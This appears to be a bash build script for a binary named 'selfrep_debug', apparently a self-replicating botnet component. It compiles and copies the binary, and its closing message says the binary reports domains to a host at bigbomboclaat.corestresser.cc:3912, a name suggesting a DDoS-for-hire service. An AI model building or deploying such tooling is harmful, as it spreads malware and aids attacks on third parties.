#!/bin/bash

# Self-Rep Debug Release Build Script
# This script builds the selfrep_debug binary and copies it to ~/release

echo "🔨 Building Self-Rep Debug Release..."
echo "====================================="

# Create release directory if it doesn't exist
mkdir -p ~/release

# Clean previous build
echo "🧹 Cleaning previous build..."
make -f Makefile_debug clean

# Build the debug version
echo "🔧 Compiling selfrep_debug..."
make -f Makefile_debug

# Check if build was successful
if [ ! -f "./selfrep_debug" ]; then
    echo "❌ Build failed! selfrep_debug binary not found."
    exit 1
fi

# Copy to release directory
echo "📦 Copying to release directory..."
cp selfrep_debug ~/release/

# Verify the copy
if [ -f "$HOME/release/selfrep_debug" ]; then
    echo "✅ Build successful!"
    echo "📁 Binary location: ~/release/selfrep_debug"
    echo "📊 Binary size: $(ls -lh ~/release/selfrep_debug | awk '{print $5}')"
    echo "🔧 Permissions: $(ls -l ~/release/selfrep_debug | awk '{print $1}')"
else
    echo "❌ Failed to copy binary to release directory"
    exit 1
fi

echo ""
echo "🚀 Release build complete!"
echo "   Binary: ~/release/selfrep_debug"
echo "   Features: Domain reporting to bigbomboclaat.corestresser.cc:3912"
echo "   Debug logging: /tmp/selfrep_debug.log"
